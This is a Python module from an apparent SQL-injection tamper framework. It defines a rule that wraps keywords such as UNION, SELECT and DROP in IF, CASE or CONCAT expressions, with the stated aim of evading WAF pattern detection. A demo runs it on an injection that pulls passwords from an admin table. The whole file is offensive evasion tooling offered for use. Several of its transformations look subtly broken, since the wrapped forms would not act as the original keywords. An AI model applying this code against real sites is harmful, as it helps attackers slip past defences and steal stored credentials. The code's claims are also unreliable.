#!/usr/bin/env python

"""
Function Wrapping Transformation

Wraps dangerous keywords in no-op SQL functions to evade
pattern-based detection.

Author: Regaan
License: GPL v2
"""

from tamper_framework.lexer import Token, TokenType
from tamper_framework.transformer import TransformationRule
from tamper_framework.context import SQLContext, ClauseType


def create_function_wrap_rule(wrap_style: str = "if") -> TransformationRule:
    """
    Create a rule that wraps keywords in no-op functions
    
    Transformation styles:
        "if"   -> IF(1,SELECT,1) 
        "case" -> CASE WHEN 1 THEN SELECT END
        "concat" -> CONCAT(SEL,ECT) (splits keyword)
    
    Only applies to high-value keywords:
    - UNION, SELECT, FROM, WHERE (in appropriate contexts)
    """
    
    # Keywords to wrap (most detected by WAFs)
    TARGET_KEYWORDS = {'UNION', 'SELECT', 'INSERT', 'UPDATE', 'DELETE', 'DROP'}
    
    def wrap_with_if(value: str) -> str:
        """Wrap with IF function"""
        return f"IF(1,{value},1)"
    
    def wrap_with_case(value: str) -> str:
        """Wrap with CASE expression"""
        return f"CASE WHEN 1 THEN {value} END"
    
    def wrap_with_concat(value: str) -> str:
        """Split and concat keyword"""
        if len(value) < 4:
            return value
        mid = len(value) // 2
        return f"CONCAT('{value[:mid]}','{value[mid:]}')"
    
    wrappers = {
        "if": wrap_with_if,
        "case": wrap_with_case,
        "concat": wrap_with_concat
    }
    
    wrapper_func = wrappers.get(wrap_style, wrap_with_if)
    
    def apply_function_wrap(token: Token, context: SQLContext) -> Token:
        """Wrap keyword in function"""
        if token.type != TokenType.KEYWORD:
            return token
        
        # Only wrap target keywords
        if token.value.upper() not in TARGET_KEYWORDS:
            return token
        
        # Don't wrap if already wrapped
        if token.value.startswith('IF(') or token.value.startswith('CASE'):
            return token
        
        new_value = wrapper_func(token.value)
        
        return Token(
            id=token.id,
            type=token.type,
            value=new_value,
            position=token.position,
            line=token.line,
            column=token.column
        )
    
    return TransformationRule(
        name="function_wrap",
        transform_func=apply_function_wrap,
        target_types=[TokenType.KEYWORD],
        skip_types=[TokenType.STRING_LITERAL, TokenType.COMMENT],
        track_transformed=True
    )


if __name__ == "__main__":
    from tamper_framework.transformer import SQLTransformer
    
    styles = ["if", "case", "concat"]
    query = "UNION SELECT password FROM admin"
    
    for style in styles:
        transformer = SQLTransformer()
        transformer.add_rule(create_function_wrap_rule(wrap_style=style))
        result = transformer.transform(query)
        print(f"Style '{style}': {result}\n")
